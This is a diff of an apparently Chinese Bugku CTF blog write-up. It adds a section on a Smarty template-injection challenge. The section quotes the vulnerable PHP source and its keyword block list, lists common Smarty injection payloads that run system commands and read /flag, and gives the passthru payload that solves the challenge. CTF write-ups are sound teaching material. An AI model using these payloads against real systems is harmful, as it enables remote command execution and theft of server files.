@@ -31,7 +31,7 @@
 <meta property="og:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003822.png">
 <meta property="og:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714122302.png">
 <meta property="article:published_time" content="2023-06-23T10:47:24.000Z">
-<meta property="article:modified_time" content="2023-07-14T04:23:55.945Z">
+<meta property="article:modified_time" content="2023-07-23T08:34:46.536Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="bugku">
 <meta name="twitter:card" content="summary">
@@ -228,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-14 12:23:55" itemprop="dateModified" datetime="2023-07-14T12:23:55+08:00">2023-07-14</time>
+                <time title="修改时间：2023-07-23 16:34:46" itemprop="dateModified" datetime="2023-07-23T16:34:46+08:00">2023-07-23</time>
               </span>
 
           <br>
@@ -237,7 +237,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>489</span>
+              <span>626</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -316,6 +316,15 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show 40c6d51</span><br></pre></td></tr></table></figure>
 
 <p>看到flag</p>
+<h2 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pass a parameter <span class="keyword">and</span> maybe the flag file<span class="string">&#x27;s filename is random :&gt; &lt;?php</span></span><br><span class="line"><span class="string">include(&#x27;</span>./libs/Smarty.<span class="keyword">class</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">echo &quot;pass a parameter and maybe the flag file&#x27;</span>s filename is random :&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span> = new Smarty();</span></span><br><span class="line"><span class="string">if(<span class="subst">$_GET</span>)&#123;</span></span><br><span class="line"><span class="string">    highlight_file(&#x27;index.php&#x27;);</span></span><br><span class="line"><span class="string">    foreach (<span class="subst">$_GET</span> AS <span class="subst">$key</span> =&gt; <span class="subst">$value</span>)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        print <span class="subst">$key</span>.&quot;</span>\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        if(preg_match(&quot;</span>/flag|\/flag/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;elseif(preg_match(&quot;</span>/system|readfile|gz|exec|<span class="keyword">eval</span>|cat|assert|file|fgets/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);            </span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        &#125;else&#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&quot;</span><span class="keyword">eval</span>:<span class="string">&quot;.<span class="subst">$value</span>);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>smarty模板注入</strong></p>
+<p>常用注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">smarty中的&#123;if&#125;标签中可以执行php语句</span><br></pre></td></tr></table></figure>
+
+<p>本题过滤了好多，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;passthru(%27tac%20/_26225%27)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -419,7 +428,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.</span> <span class="nav-text">留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alert"><span class="nav-number">2.</span> <span class="nav-text">alert</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">3.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#never-give-up"><span class="nav-number">4.</span> <span class="nav-text">never_give_up</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#source"><span class="nav-number">6.</span> <span class="nav-text">source</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.</span> <span class="nav-text">留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alert"><span class="nav-number">2.</span> <span class="nav-text">alert</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">3.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#never-give-up"><span class="nav-number">4.</span> <span class="nav-text">never_give_up</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#source"><span class="nav-number">6.</span> <span class="nav-text">source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84php"><span class="nav-number">7.</span> <span class="nav-text">聪明的php</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -435,7 +444,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -448,7 +457,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -484,12 +493,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">62k</span>
+    <span title="站点总字数">64k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:44</span>
+    <span title="站点阅读时长">3:54</span>
 </div>
 
 <!--
